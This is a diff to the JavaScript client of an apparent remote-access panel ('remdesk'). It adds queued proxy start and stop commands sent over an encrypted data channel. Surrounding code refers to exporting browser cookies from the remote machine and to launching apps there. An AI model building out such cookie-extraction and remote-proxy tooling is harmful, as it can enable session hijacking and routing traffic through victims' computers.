@@ -229,6 +229,41 @@
     );
   }
 
+  async function requestProxyControl(action, options, retry = false) {
+    const actionName = action === "proxy_stop" ? "Stopping" : "Starting";
+    if (!retry) {
+      state.pendingProxyControl = {
+        action,
+        options: options && typeof options === "object" ? options : null
+      };
+      state.pendingExportRetries = 0;
+    }
+    remdesk.setDownloadStatus(`${actionName} proxy...`, "warn");
+    const payload = { action };
+    if (options && typeof options === "object") {
+      Object.assign(payload, options);
+    }
+    await sendChannelPayload(
+      payload,
+      () => {
+        remdesk.setDownloadStatus("Data channel not ready", "warn");
+        state.pendingProxyControl = null;
+      },
+      (error) => {
+        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
+        state.pendingProxyControl = null;
+      }
+    );
+  }
+
+  async function requestProxyStart(options, retry = false) {
+    await requestProxyControl("proxy_start", options, retry);
+  }
+
+  async function requestProxyStop(options, retry = false) {
+    await requestProxyControl("proxy_stop", options, retry);
+  }
+
   async function requestAppLaunch(appName) {
     if (!state.controlEnabled) {
       remdesk.setAppStatus("Switch to manage mode to launch apps", "warn");
@@ -328,6 +363,26 @@
     });
   }
 
+  function drainProxyControlQueue() {
+    if (!state.isConnected) {
+      return;
+    }
+    const queue = window.__remdeskProxyControlQueue;
+    if (!Array.isArray(queue) || queue.length === 0) {
+      return;
+    }
+    window.__remdeskProxyControlQueue = [];
+    queue.forEach((entry) => {
+      if (entry && typeof entry === "object") {
+        if (entry.action === "proxy_stop") {
+          void requestProxyStop(entry.options || null);
+        } else {
+          void requestProxyStart(entry.options || null);
+        }
+      }
+    });
+  }
+
   window.remdeskDownloadCookies = (browsers, filename) => {
     if (!remdesk.ensureChannelOpen()) {
       const list = Array.isArray(browsers)
@@ -351,6 +406,24 @@
     void requestProxyExport(clientId, filename);
   };
 
+  window.remdeskProxyStart = (options) => {
+    if (!remdesk.ensureChannelOpen()) {
+      window.__remdeskProxyControlQueue = window.__remdeskProxyControlQueue || [];
+      window.__remdeskProxyControlQueue.push({ action: "proxy_start", options: options || null });
+      return;
+    }
+    void requestProxyStart(options || null);
+  };
+
+  window.remdeskProxyStop = (options) => {
+    if (!remdesk.ensureChannelOpen()) {
+      window.__remdeskProxyControlQueue = window.__remdeskProxyControlQueue || [];
+      window.__remdeskProxyControlQueue.push({ action: "proxy_stop", options: options || null });
+      return;
+    }
+    void requestProxyStop(options || null);
+  };
+
   function retryPendingExport() {
     if (!state.pendingExport || !remdesk.ensureChannelOpen()) {
       return;
@@ -370,6 +443,18 @@
     if (state.pendingExport.kind === "proxy") {
       void requestProxyExport(state.pendingExport.clientId || null, state.pendingExport.filename || null, true);
     }
+  }
+
+  function handleProxyControlResponse(payload) {
+    const action = payload && payload.action ? payload.action : "proxy";
+    const success = payload && payload.success !== false;
+    const label = action === "proxy_stop" ? "Proxy stopped" : "Proxy started";
+    if (success) {
+      remdesk.setDownloadStatus(label, "ok");
+    } else {
+      remdesk.setDownloadStatus(`${label} failed`, "bad");
+    }
+    state.pendingProxyControl = null;
   }
 
   function handleFileList(entries) {
@@ -507,6 +592,11 @@
       state.pendingAppLaunch = null;
       return;
     }
+    if (state.pendingProxyControl) {
+      remdesk.setDownloadStatus(message, "bad");
+      state.pendingProxyControl = null;
+      return;
+    }
     if (state.pendingDownload) {
       if (state.pendingDownload.kind === "cookies") {
         remdesk.setCookieStatus(message, "bad");
@@ -554,10 +644,14 @@
   remdesk.buildProxyFilename = buildProxyFilename;
   remdesk.requestCookieExport = requestCookieExport;
   remdesk.requestProxyExport = requestProxyExport;
+  remdesk.requestProxyStart = requestProxyStart;
+  remdesk.requestProxyStop = requestProxyStop;
   remdesk.requestAppLaunch = requestAppLaunch;
   remdesk.drainCookieQueue = drainCookieQueue;
   remdesk.drainProxyQueue = drainProxyQueue;
+  remdesk.drainProxyControlQueue = drainProxyControlQueue;
   remdesk.retryPendingExport = retryPendingExport;
+  remdesk.handleProxyControlResponse = handleProxyControlResponse;
   remdesk.handleFileList = handleFileList;
   remdesk.getBaseName = getBaseName;
   remdesk.addDownloadEntry = addDownloadEntry;
